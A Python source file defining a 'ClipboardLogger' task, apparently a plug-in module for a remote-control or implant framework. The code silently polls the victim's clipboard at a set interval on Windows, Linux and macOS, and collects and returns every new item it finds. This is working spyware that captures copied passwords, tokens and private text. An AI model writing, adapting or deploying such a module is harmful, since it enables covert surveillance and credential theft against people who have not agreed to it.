from tasks.__task import Task


class ClipboardLogger(Task):
    """Periodically dump new clipboard contents."""
    platforms = ["win32", "linux", "darwin"]
    description = __doc__
    administrator = {"win32": False, "linux": False, "darwin": False}
    kwargs = {"log_time": {"type": int, "description": "Logging time in seconds", "default": 900},
              "log_frequency": {"type": int, "description": "Delay between next clipboard checks", "default": 5}}
    packages = ["pyperclip"]

    def __init__(self, task_id):
        super(ClipboardLogger, self).__init__(task_id)
        import logging
        import threading

        self._logger = logging.getLogger(self.__class__.__name__)
        self._data = []
        self._run = threading.Event()

    def run(self, **kwargs):
        assert "log_time" in kwargs, "Missing keyword argument log_time"
        assert "log_frequency" in kwargs, "Missing keyword argument log_frequency"

        log_time = int(kwargs.get("log_time"))
        log_frequency = int(kwargs.get("log_frequency"))

        assert log_time > 0, "Log time must be greater than 0"
        assert log_frequency > 0, "Log frequency must be greater than 0"

        import time
        import pyperclip

        self._run.set()
        for i in range(0, log_time, log_frequency):
            if self._run.is_set():
                data = pyperclip.paste()
                if data not in self._data:
                    self._data.append(data)
                    self._logger.debug("New item in clipboard: {}".format(data))
                time.sleep(log_frequency)
            else:
                break
        return self._data

    def stop(self):
        self._run.clear()
